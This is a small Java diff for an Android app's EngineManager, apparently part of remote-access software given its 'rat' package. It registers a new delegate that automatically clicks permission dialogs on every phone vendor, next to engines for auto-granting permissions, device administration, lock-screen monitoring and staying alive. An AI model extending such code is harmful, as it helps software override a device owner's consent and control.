@@ -9,6 +9,7 @@ import com.vendor.rat.auto.engine.DeviceAdminEngine;
 import com.vendor.rat.auto.engine.LockScreenMonitor;
 import com.vendor.rat.auto.engine.PermissionAutoGrantEngine;
 import com.vendor.rat.auto.engine.AospKeepAliveEngine;
+import com.vendor.rat.auto.engine.vendor.GrantPermissionsDelegate;
 import com.vendor.rat.auto.engine.vendor.HuaweiEngine;
 import com.vendor.rat.auto.engine.vendor.OppoEngine;
 import com.vendor.rat.auto.engine.vendor.OppoPermissionEngine;
@@ -103,6 +104,10 @@ public class EngineManager {
         // 权限自动授予引擎 — 所有厂商通用 (被动监听)
         register(new PermissionAutoGrantEngine());
         Log.d(TAG, "Registered PermissionAutoGrantEngine");
+
+        // 权限对话框自动点击代理 — 所有厂商通用 (GKD Selector 方式)
+        register(new GrantPermissionsDelegate());
+        Log.d(TAG, "Registered GrantPermissionsDelegate");
 
         if (DeviceUtils.isXiaomi()) {
             register(new XiaomiEngine());
